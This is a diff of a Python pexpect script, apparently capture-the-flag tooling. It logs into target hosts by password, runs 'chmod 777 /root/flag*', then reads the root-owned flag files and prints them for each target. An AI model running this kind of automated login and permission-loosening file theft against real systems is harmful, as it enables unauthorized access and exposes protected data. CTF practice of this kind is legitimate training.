@@ -40,7 +40,7 @@ with open(path, 'wb') as f:
         exit(0)
 
     child.sendline(password)
-    res = child.expect(['#', 'Permission denied', pexpect.TIMEOUT, pexpect.EOF], timeout=10)
+    res = child.expect(['[#$]', 'Permission denied', pexpect.TIMEOUT, pexpect.EOF], timeout=10)
     if res == 1:
         print 'Permission denied'
         exit(0)
@@ -48,9 +48,13 @@ with open(path, 'wb') as f:
         print 'Connect Time out'
         exit(0)
 
+    # 修改文件的权限,当然得是ROOT用户才有效
+    child.sendline('chmod 777 /root/flag*')
+    child.expect([r'\[.*\][$#]'])
+
     # 获取Flag值,为什么这么麻烦..
-    child.sendline('chmod 777 /root/flag* && cat /root/flag*')
-    child.expect(r'\[.*\]\#')
+    child.sendline('cat /root/flag*')
+    child.expect(r'\[.*\][$#]')
     flag = child.before.split('\n')[1].replace('\n', '')
     print '[Flag] %s - %s' % (target, flag)
 
